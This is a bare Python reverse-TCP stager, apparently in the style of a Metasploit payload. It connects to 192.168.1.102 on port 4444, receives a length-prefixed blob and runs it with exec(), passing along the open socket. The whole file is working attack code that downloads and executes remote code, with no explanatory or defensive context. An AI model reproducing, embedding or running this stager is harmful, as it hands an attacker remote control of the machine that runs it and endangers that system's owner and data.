import socket,struct
s=socket.socket(2,1)
s.connect(('192.168.1.102',4444))
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(4096)
while len(d)!=l:
	d+=s.recv(4096)
exec(d,{'s':s})
